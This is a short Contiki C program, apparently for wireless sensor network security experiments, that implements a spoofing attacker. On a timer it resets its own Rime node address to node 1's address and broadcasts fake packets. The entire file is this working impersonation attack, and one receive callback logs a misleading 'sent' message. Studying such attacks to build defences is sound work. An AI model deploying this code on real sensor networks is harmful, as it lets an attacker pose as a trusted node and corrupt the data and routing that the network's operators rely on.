#include "contiki.h"
#include "net/rime.h"
#include "stdio.h"

PROCESS(spoofing_process, "Spoofing Attacker");
AUTOSTART_PROCESSES(&spoofing_process);

static void broadcast_recv(struct broadcast_conn *c, const rimeaddr_t *from) {
  printf("Spoof attacker: Sent fake packet claiming to be node 1\n");
}

static const struct broadcast_callbacks broadcast_call = {broadcast_recv};
static struct broadcast_conn broadcast;

PROCESS_THREAD(spoofing_process, ev, data) {
  static struct etimer timer;
  PROCESS_BEGIN();

  broadcast_open(&broadcast, 129, &broadcast_call);
  etimer_set(&timer, CLOCK_SECOND * 3);

  while(1) {
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));
    rimeaddr_t fake_addr;
    fake_addr.u8[0] = 1;
    fake_addr.u8[1] = 0;
    rimeaddr_set_node_addr(&fake_addr);

    packetbuf_copyfrom("Fake packet", 11);
    broadcast_send(&broadcast);
    printf("Spoof attacker: Sent fake packet claiming to be node 1\n");

    etimer_reset(&timer);
  }

  PROCESS_END();
}
